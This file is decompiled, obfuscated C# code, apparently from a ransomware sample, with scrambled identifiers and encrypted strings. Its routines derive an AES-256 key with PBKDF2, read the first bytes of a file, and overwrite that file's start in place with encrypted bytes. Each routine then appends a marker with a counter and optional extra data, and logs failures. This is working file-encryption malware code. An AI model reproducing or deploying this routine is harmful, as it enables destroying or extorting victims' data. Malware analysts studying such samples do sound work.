using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

public static class NaRnXemgrEhEu
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] vWTJMcrwiwmBiRL(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = xqapYRddcVHGGL(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes xqapYRddcVHGGL(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] CfIULFaxXTze(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (hNCHegfceoe.VvUkitdKffw == getString_0(107396853))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (hNCHegfceoe.LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(hNCHegfceoe.KymHhFbNcwDYA, getString_0(107404630) + string_0 + getString_0(107353138) + ex.Message + getString_0(107396620));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool dyvfLRQwyjnq(string CeNYFaLSDRX, byte[] NlACJGRWEHCA, byte[] YSvPvJtuif = null)
	{
		try
		{
			byte[] array = null;
			if (hNCHegfceoe.VvUkitdKffw == getString_0(107396853))
			{
				array = (hNCHegfceoe.aeWIyHaDtadg ? Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(hNCHegfceoe.XkpwdvjSZi) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353112)) + Convert.ToString(hNCHegfceoe.vwHJGZSsQHuV) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353112))) : Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(hNCHegfceoe.XkpwdvjSZi) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353121)) + Convert.ToString(hNCHegfceoe.vwHJGZSsQHuV) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353121))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CeNYFaLSDRX, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(NlACJGRWEHCA, 0, NlACJGRWEHCA.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(CeNYFaLSDRX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!hNCHegfceoe.aeWIyHaDtadg)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(YSvPvJtuif, 0, YSvPvJtuif.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (hNCHegfceoe.aeWIyHaDtadg ? Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(hNCHegfceoe.XkpwdvjSZi) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353112)) + Convert.ToString(hNCHegfceoe.vwHJGZSsQHuV) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353112))) : Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(hNCHegfceoe.XkpwdvjSZi) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353121)) + Convert.ToString(hNCHegfceoe.vwHJGZSsQHuV) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353121))));
				FileStream fileStream2 = new FileStream(CeNYFaLSDRX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(NlACJGRWEHCA, 0, NlACJGRWEHCA.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(CeNYFaLSDRX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!hNCHegfceoe.aeWIyHaDtadg)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(YSvPvJtuif, 0, YSvPvJtuif.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			hNCHegfceoe.FqOxBTVEHuVPbA++;
		}
		catch (Exception ex)
		{
			if (hNCHegfceoe.LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(hNCHegfceoe.KymHhFbNcwDYA, getString_0(107404630) + CeNYFaLSDRX + getString_0(107353071) + ex.Message + getString_0(107396620));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (hNCHegfceoe.aeWIyHaDtadg ? Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(hNCHegfceoe.XkpwdvjSZi) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353112)) + Convert.ToString(hNCHegfceoe.vwHJGZSsQHuV) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353112))) : Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(hNCHegfceoe.XkpwdvjSZi) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353121)) + Convert.ToString(hNCHegfceoe.vwHJGZSsQHuV) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353121))));
				FileStream fileStream4 = new FileStream(CeNYFaLSDRX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(NlACJGRWEHCA, 0, NlACJGRWEHCA.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(CeNYFaLSDRX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!hNCHegfceoe.aeWIyHaDtadg)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(YSvPvJtuif, 0, YSvPvJtuif.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static NaRnXemgrEhEu()
	{
		Strings.CreateGetStringDelegate(typeof(NaRnXemgrEhEu));
	}
}
